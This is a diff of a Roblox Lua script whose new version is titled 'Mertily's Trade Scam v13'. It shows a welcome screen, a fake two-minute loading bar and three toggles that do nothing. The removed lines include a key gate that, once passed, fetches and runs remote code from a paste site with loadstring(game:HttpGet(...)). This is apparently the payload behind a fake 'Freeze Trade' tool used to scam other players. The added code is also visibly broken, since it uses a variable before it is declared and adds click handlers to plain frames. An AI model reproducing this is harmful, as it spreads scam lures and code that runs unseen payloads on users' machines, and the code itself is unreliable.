@@ -1,221 +1,287 @@
--- ============================================================
--- 0. КЛЮЧЕВАЯ СИСТЕМА
--- ============================================================
-local CorrectKey = "Key-T28a-O19Z-S153-472B-Key"
-local UserInputService = game:GetService("UserInputService")
+-- 🌐 Mertily's Trade Scam v13 (ТОЧНО БЕЗ КЛЮЧА)
 local Players = game:GetService("Players")
-local LocalPlayer = Players.LocalPlayer
-local playerGui = LocalPlayer:WaitForChild("PlayerGui")
+local Player = Players.LocalPlayer
+local TweenService = game:GetService("TweenService")
+local UIS = game:GetService("UserInputService")
+local SoundService = game:GetService("SoundService")
 
-local KeyGui = Instance.new("ScreenGui")
-KeyGui.Name = "KeySystem"
-KeyGui.Parent = playerGui
-KeyGui.ResetOnSpawn = false
-KeyGui.Enabled = false
+local playerGui = Player:WaitForChild("PlayerGui")
 
-local KeyMain = Instance.new("Frame")
-KeyMain.Parent = KeyGui
-KeyMain.Size = UDim2.new(0, 350, 0, 200)
-KeyMain.Position = UDim2.new(0.5, -175, 0.5, -100)
-KeyMain.BackgroundColor3 = Color3.fromRGB(18, 20, 22)
-KeyMain.BorderSizePixel = 0
-KeyMain.BackgroundTransparency = 1
-local KeyCorner = Instance.new("UICorner")
-KeyCorner.Parent = KeyMain
-KeyCorner.CornerRadius = UDim.new(0, 12)
+-- 🛡️ Защита от пропадания после смерти
+if playerGui:FindFirstChild("MainMenu") then
+    playerGui.MainMenu:Destroy()
+end
 
-local KeyTitle = Instance.new("TextLabel")
-KeyTitle.Parent = KeyMain
-KeyTitle.Size = UDim2.new(1, 0, 0, 40)
-KeyTitle.Position = UDim2.new(0, 0, 0, 10)
-KeyTitle.BackgroundTransparency = 1
-KeyTitle.Text = "Введите ключ для доступа"
-KeyTitle.TextColor3 = Color3.fromRGB(220, 220, 220)
-KeyTitle.TextSize = 16
-KeyTitle.Font = Enum.Font.GothamBold
-KeyTitle.TextTransparency = 1
+-- 📦 Создаём главный ScreenGui
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "MainMenu"
+screenGui.ResetOnSpawn = false
+screenGui.Parent = playerGui
 
-local KeyInput = Instance.new("TextBox")
-KeyInput.Parent = KeyMain
-KeyInput.Size = UDim2.new(0, 280, 0, 45)
-KeyInput.Position = UDim2.new(0.5, -140, 0.5, -20)
-KeyInput.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
-KeyInput.TextColor3 = Color3.fromRGB(255, 255, 255)
-KeyInput.TextSize = 14
-KeyInput.Font = Enum.Font.Gotham
-KeyInput.PlaceholderText = "Введите ключ здесь..."
-KeyInput.Text = ""
-KeyInput.BackgroundTransparency = 1
+-- 🖤 ЧЕРНЫЙ ФОН (сразу виден)
+local bg = Instance.new("Frame")
+bg.Size = UDim2.new(1, 0, 1, 0)
+bg.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
+bg.BackgroundTransparency = 0
+bg.Parent = screenGui
 
-local KeyBtn = Instance.new("TextButton")
-KeyBtn.Parent = KeyMain
-KeyBtn.Size = UDim2.new(0, 150, 0, 45)
-KeyBtn.Position = UDim2.new(0.5, -75, 0.8, -20)
-KeyBtn.BackgroundColor3 = Color3.fromRGB(50, 120, 200)
-KeyBtn.Text = "Активировать"
-KeyBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-KeyBtn.TextSize = 14
-KeyBtn.Font = Enum.Font.GothamBold
-KeyBtn.BackgroundTransparency = 1
+-- 🌟 Функция плавного перехода (Tween)
+local function tweenObject(obj, props, time)
+    local tween = TweenService:Create(obj, TweenInfo.new(time, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), props)
+    tween:Play()
+    return tween
+end
 
-local KeyStatus = Instance.new("TextLabel")
-KeyStatus.Parent = KeyMain
-KeyStatus.Size = UDim2.new(1, 0, 0, 20)
-KeyStatus.Position = UDim2.new(0, 0, 0.5, 10)
-KeyStatus.BackgroundTransparency = 1
-KeyStatus.Text = ""
-KeyStatus.TextColor3 = Color3.fromRGB(150, 150, 150)
-KeyStatus.TextSize = 12
-KeyStatus.Font = Enum.Font.Gotham
-KeyStatus.TextTransparency = 1
+-- 🎵 Звук
+local soundId = 1841647093
+local function playMusic()
+    local sound = Instance.new("Sound")
+    sound.SoundId = "rbxassetid://" .. soundId
+    sound.Looped = false
+    sound.Volume = 0.5
+    sound.Parent = SoundService
+    sound:Play()
+    return sound
+end
 
-KeyBtn.MouseButton1Click:Connect(function()
-    if KeyInput.Text == CorrectKey then
-        KeyStatus.Text = "✅ Ключ верный! Загрузка скрипта..."
-        KeyStatus.TextColor3 = Color3.fromRGB(0, 255, 0)
-        task.wait(0.5)
-        KeyGui:Destroy()
-        
-        -- ============================================================
-        -- 1. ЗАГРУЗКА ДОПОЛНИТЕЛЬНОГО СКРИПТА (СРАЗУ ПОСЛЕ КЛЮЧА)
-        -- ============================================================
-        loadstring(game:HttpGet("https://cdn.sourceb.in/bins/cCS4jW4Mph/0"))()
-        
-        -- ============================================================
-        -- 2. ОСНОВНАЯ ЗАГРУЗКА И МЕНЮ
-        -- ============================================================
-        StartLoaderAndMenu()
-    else
-        KeyStatus.Text = "❌ Неверный ключ. Попробуйте снова."
-        KeyStatus.TextColor3 = Color3.fromRGB(255, 0, 0)
-        KeyInput.Text = ""
+local function fadeOutMusic(sound, duration)
+    if not sound then return end
+    local startVol = sound.Volume
+    local steps = 30
+    for i = 1, steps do
+        sound.Volume = startVol * (1 - i / steps)
+        task.wait(duration / steps)
     end
-end)
+    sound:Stop()
+    sound:Destroy()
+end
 
-KeyInput.FocusLost:Connect(function()
-    KeyBtn.MouseButton1Click:Fire()
-end)
+-- 🟦 Функция создания сглаженной рамки
+local function createRoundedFrame(parent, size, pos, color, transparent)
+    local frame = Instance.new("Frame")
+    frame.Size = size
+    frame.Position = pos
+    frame.BackgroundColor3 = color or Color3.fromRGB(30, 30, 30)
+    frame.BackgroundTransparency = transparent or 0
+    frame.BorderSizePixel = 0
+    frame.Parent = parent
+    local corner = Instance.new("UICorner")
+    corner.CornerRadius = UDim.new(0, 12)
+    corner.Parent = frame
+    return frame
+end
 
-KeyGui.Enabled = true
-TweenService:Create(KeyMain, TweenInfo.new(0.8), {BackgroundTransparency = 0}):Play()
-TweenService:Create(KeyTitle, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
-TweenService:Create(KeyInput, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
-TweenService:Create(KeyBtn, TweenInfo.new(0.5), {BackgroundTransparency = 0}):Play()
-TweenService:Create(KeyStatus, TweenInfo.new(0.5), {TextTransparency = 0}):Play()
+-- 🟥 ПРИВЕТСТВИЕ (показывается сразу)
+local function showWelcome()
+    local welcomeFrame = Instance.new("Frame")
+    welcomeFrame.Size = UDim2.new(1, 0, 1, 0)
+    welcomeFrame.BackgroundTransparency = 1
+    welcomeFrame.Parent = screenGui
 
--- ============================================================
--- 3. ЗАГРУЗКА И МЕНЮ
--- ============================================================
-function StartLoaderAndMenu()
-    local TweenService = game:GetService("TweenService")
-    local playerGui = LocalPlayer:WaitForChild("PlayerGui")
-    
-    local LoaderGui = Instance.new("ScreenGui")
-    LoaderGui.Name = "LoaderScreen"
-    LoaderGui.Parent = playerGui
-    LoaderGui.ResetOnSpawn = false
-    
-    local LFrame = Instance.new("Frame")
-    LFrame.Parent = LoaderGui
-    LFrame.Size = UDim2.new(0, 350, 0, 200)
-    LFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
-    LFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 22)
-    LFrame.BorderSizePixel = 0
-    local LCorner = Instance.new("UICorner")
-    LCorner.Parent = LFrame
-    LCorner.CornerRadius = UDim.new(0, 12)
+    local welcomeText = Instance.new("TextLabel")
+    welcomeText.Size = UDim2.new(1, 0, 0, 100)
+    welcomeText.Position = UDim2.new(0, 0, 0.4, -50)
+    welcomeText.BackgroundTransparency = 1
+    welcomeText.Text = "Добро пожаловать, Мастер!"
+    welcomeText.TextColor3 = Color3.fromRGB(255, 255, 255)
+    welcomeText.TextScaled = true
+    welcomeText.Font = Enum.Font.GothamBold
+    welcomeText.TextWrapped = true
+    welcomeText.Parent = welcomeFrame
 
-    local LStatus = Instance.new("TextLabel")
-    LStatus.Parent = LFrame
-    LStatus.Size = UDim2.new(1, 0, 0, 50)
-    LStatus.Position = UDim2.new(0, 0, 0, 20)
-    LStatus.BackgroundTransparency = 1
-    LStatus.Text = "Загрузка..."
-    LStatus.TextColor3 = Color3.fromRGB(220, 220, 220)
-    LStatus.TextSize = 16
-    LStatus.Font = Enum.Font.GothamBold
-    
-    local PBarBg = Instance.new("Frame")
-    PBarBg.Parent = LFrame
-    PBarBg.Size = UDim2.new(0, 280, 0, 15)
-    PBarBg.Position = UDim2.new(0.5, -140, 0.8, -20)
-    PBarBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
-    local PBarCorner = Instance.new("UICorner")
-    PBarCorner.Parent = PBarBg
-    PBarCorner.CornerRadius = UDim.new(1, 0)
-    
-    local PBar = Instance.new("Frame")
-    PBar.Parent = PBarBg
-    PBar.Size = UDim2.new(0, 0, 1, 0)
-    PBar.BackgroundColor3 = Color3.fromRGB(70, 130, 200)
-    local PBarCorner2 = Instance.new("UICorner")
-    PBarCorner2.Parent = PBar
-    PBarCorner2.CornerRadius = UDim.new(1, 0)
-    
-    local PText = Instance.new("TextLabel")
-    PText.Parent = LFrame
-    PText.Size = UDim2.new(1, 0, 0, 30)
-    PText.Position = UDim2.new(0, 0, 0, 120)
-    PText.BackgroundTransparency = 1
-    PText.Text = "0%"
-    PText.TextColor3 = Color3.fromRGB(180, 180, 180)
-    PText.TextSize = 14
-    PText.Font = Enum.Font.Gotham
+    local subText = Instance.new("TextLabel")
+    subText.Size = UDim2.new(1, 0, 0, 60)
+    subText.Position = UDim2.new(0, 0, 0.6, -30)
+    subText.BackgroundTransparency = 1
+    subText.Text = "Mertily's Trade Scam v13"
+    subText.TextColor3 = Color3.fromRGB(200, 200, 200)
+    subText.TextScaled = true
+    subText.Font = Enum.Font.Gotham
+    subText.TextWrapped = true
+    subText.Parent = welcomeFrame
 
-    -- ТОЧНО 2 МИНУТЫ (120 СЕКУНД)
-    task.spawn(function()
-        local startTime = tick()
-        local targetTime = 120
-        local currentPercent = 0
-        
-        while currentPercent < 100 do
-            local elapsed = tick() - startTime
-            local targetPercent = (elapsed / targetTime) * 100
-            currentPercent = math.min(targetPercent + math.random(0, 2), 100)
-            
-            TweenService:Create(PBar, TweenInfo.new(0.1), {
-                Size = UDim2.new(currentPercent / 100, 0, 1, 0)
-            }):Play()
-            PText.Text = math.floor(currentPercent) .. "%"
-            
-            task.wait(0.1)
+    welcomeText.TextTransparency = 1
+    subText.TextTransparency = 1
+    tweenObject(welcomeText, {TextTransparency = 0}, 1)
+    tweenObject(subText, {TextTransparency = 0}, 1)
+
+    wait(2)
+    tweenObject(welcomeFrame, {BackgroundTransparency = 1}, 0.8)
+    wait(0.8)
+    welcomeFrame:Destroy()
+end
+
+-- ⏳ Окно загрузки (2 МИНУТЫ)
+local function showLoading()
+    local music = playMusic()
+
+    local loadFrame = createRoundedFrame(screenGui, UDim2.new(0, 400, 0, 150), UDim2.new(0.5, -200, 0.5, -75), Color3.fromRGB(10, 10, 10), 0)
+    loadFrame.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
+
+    local loadLabel = Instance.new("TextLabel")
+    loadLabel.Size = UDim2.new(1, 0, 0, 40)
+    loadLabel.Position = UDim2.new(0, 0, 0, 20)
+    loadLabel.BackgroundTransparency = 1
+    loadLabel.Text = "Ожидайте пока идет загрузка..."
+    loadLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
+    loadLabel.TextScaled = true
+    loadLabel.Font = Enum.Font.GothamBold
+    loadLabel.Parent = loadFrame
+
+    local progressLabel = Instance.new("TextLabel")
+    progressLabel.Size = UDim2.new(1, 0, 0, 40)
+    progressLabel.Position = UDim2.new(0, 0, 0, 80)
+    progressLabel.BackgroundTransparency = 1
+    progressLabel.Text = "0%"
+    progressLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
+    progressLabel.TextScaled = true
+    progressLabel.Font = Enum.Font.Gotham
+    progressLabel.Parent = loadFrame
+
+    local startTime = tick()
+    local duration = 120
+
+    while tick() - startTime < duration do
+        local elapsed = tick() - startTime
+        local percent = math.min(elapsed / duration * 100, 100)
+        progressLabel.Text = math.floor(percent) .. "%"
+        task.wait(0.1)
+    end
+
+    progressLabel.Text = "100%"
+    wait(0.5)
+
+    fadeOutMusic(music, 2)
+
+    tweenObject(loadFrame, {BackgroundTransparency = 1}, 0.5)
+    for _, child in ipairs(loadFrame:GetChildren()) do
+        tweenObject(child, {TextTransparency = 1}, 0.5)
+    end
+    wait(0.6)
+    loadFrame:Destroy()
+
+    -- 🎬 ПОКАЗЫВАЕМ ГЛАВНОЕ МЕНЮ
+    mainFrame.Visible = true
+    mainFrame.BackgroundTransparency = 1
+    tweenObject(mainFrame, {BackgroundTransparency = 0}, 0.8)
+    for _, child in ipairs(mainFrame:GetChildren()) do
+        if child:IsA("TextLabel") or child:IsA("Frame") then
+            tweenObject(child, {BackgroundTransparency = 0}, 0.6)
         end
-        
-        PText.Text = "100%"
-        task.wait(0.5)
-        LoaderGui:Destroy()
-        
-        -- ============================================================
-        -- 4. МЕНЮ (FREEZE TRADE) - ТЕПЕРЬ ТОЧНО ПОЯВИТСЯ
-        -- ============================================================
-        local MenuGui = Instance.new("ScreenGui")
-        MenuGui.Name = "FreezeTradeMenu"
-        MenuGui.Parent = playerGui
-        MenuGui.ResetOnSpawn = false
-        
-        local MFrame = Instance.new("Frame")
-        MFrame.Parent = MenuGui
-        MFrame.Size = UDim2.new(0, 350, 0, 200)
-        MFrame.Position = UDim2.new(0.5, -175, 0.5, -100)
-        MFrame.BackgroundColor3 = Color3.fromRGB(18, 20, 22)
-        MFrame.BorderSizePixel = 0
-        local MCorner = Instance.new("UICorner")
-        MCorner.Parent = MFrame
-        MCorner.CornerRadius = UDim.new(0, 12)
-        
-        local MTitle = Instance.new("TextLabel")
-        MTitle.Parent = MFrame
-        MTitle.Size = UDim2.new(1, 0, 0, 40)
-        MTitle.Position = UDim2.new(0, 15, 0, 0)
-        MTitle.BackgroundTransparency = 1
-        MTitle.Text = "Freeze Trade"
-        MTitle.TextColor3 = Color3.fromRGB(220, 220, 220)
-        MTitle.TextSize = 14
-        MTitle.Font = Enum.Font.GothamBold
-        MTitle.TextXAlignment = Enum.TextXAlignment.Left
+    end
+end
 
-        local function createSwitch(parent, yPos, label, cb)
-            local c = Instance.new("Frame")
-            c.Parent = parent
-            c.Size = UDim2.new(1, -30, 0, 50)
-           
+-- 🖥️ ГЛАВНОЕ МЕНЮ
+local mainFrame = createRoundedFrame(screenGui, UDim2.new(0, 600, 0, 400), UDim2.new(0.5, -300, 0.5, -200), Color3.fromRGB(15, 15, 15), 1)
+mainFrame.Visible = false
+
+local title = Instance.new("TextLabel")
+title.Size = UDim2.new(1, 0, 0, 50)
+title.Position = UDim2.new(0, 0, 0, 0)
+title.BackgroundTransparency = 1
+title.Text = "Mertily's trade scam"
+title.TextColor3 = Color3.fromRGB(255, 255, 255)
+title.TextScaled = true
+title.Font = Enum.Font.GothamBold
+title.Parent = mainFrame
+
+-- 🔘 ПЕРЕКЛЮЧАТЕЛИ
+local switchFrame = Instance.new("Frame")
+switchFrame.Size = UDim2.new(1, 0, 0, 200)
+switchFrame.Position = UDim2.new(0, 0, 0, 70)
+switchFrame.BackgroundTransparency = 1
+switchFrame.Parent = mainFrame
+
+for i = 1, 3 do
+    local sw = Instance.new("Frame")
+    sw.Size = UDim2.new(0.9, 0, 0, 40)
+    sw.Position = UDim2.new(0.05, 0, 0, (i-1) * 50 + 10)
+    sw.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    sw.BorderSizePixel = 0
+    sw.Parent = switchFrame
+
+    local swCorner = Instance.new("UICorner")
+    swCorner.CornerRadius = UDim.new(0, 10)
+    swCorner.Parent = sw
+
+    local lbl = Instance.new("TextLabel")
+    lbl.Size = UDim2.new(0.7, 0, 1, 0)
+    lbl.BackgroundTransparency = 1
+    lbl.Text = "Функция " .. i
+    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
+    lbl.TextScaled = true
+    lbl.Font = Enum.Font.Gotham
+    lbl.TextXAlignment = Enum.TextXAlignment.Left
+    lbl.Position = UDim2.new(0.05, 0, 0, 0)
+    lbl.Parent = sw
+
+    local toggle = Instance.new("Frame")
+    toggle.Size = UDim2.new(0, 60, 0, 30)
+    toggle.Position = UDim2.new(0.85, 0, 0.5, -15)
+    toggle.BackgroundColor3 = Color3.fromRGB(100, 100, 100)
+    toggle.BorderSizePixel = 0
+    toggle.Parent = sw
+
+    local toggleCorner = Instance.new("UICorner")
+    toggleCorner.CornerRadius = UDim.new(0, 15)
+    toggleCorner.Parent = toggle
+
+    local knob = Instance.new("Frame")
+    knob.Size = UDim2.new(0, 26, 0, 26)
+    knob.Position = UDim2.new(0, 2, 0, 2)
+    knob.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+    knob.BorderSizePixel = 0
+    knob.Parent = toggle
+
+    local knobCorner = Instance.new("UICorner")
+    knobCorner.CornerRadius = UDim.new(0, 13)
+    knobCorner.Parent = knob
+
+    toggle.MouseButton1Click:Connect(function()
+        local state = not toggle:GetAttribute("State")
+        toggle:SetAttribute("State", state)
+        local targetPos = state and UDim2.new(0, 32, 0, 2) or UDim2.new(0, 2, 0, 2)
+        local targetColor = state and Color3.fromRGB(0, 200, 0) or Color3.fromRGB(100, 100, 100)
+        tweenObject(knob, {Position = targetPos}, 0.3)
+        tweenObject(toggle, {BackgroundColor3 = targetColor}, 0.3)
+    end)
+end
+
+-- 🚀 ЗАПУСК (БЕЗ КЛЮЧА)
+showWelcome()
+wait(3)
+showLoading()
+
+-- 🖱️ ПЕРЕТАСКИВАНИЕ
+local function makeDraggable(frame)
+    local dragging = false
+    local dragInput, dragStart, startPos
+
+    frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+            dragging = true
+            dragStart = input.Position
+            startPos = frame.Position
+            input.Changed:Connect(function()
+                if input.UserInputState == Enum.UserInputState.End then
+                    dragging = false
+                end
+            end)
+        end
+    end)
+
+    frame.InputChanged:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+            dragInput = input
+        end
+    end)
+
+    UIS.InputChanged:Connect(function(input)
+        if input == dragInput and dragging then
+            local delta = input.Position - dragStart
+            frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+end
+
+makeDraggable(mainFrame)
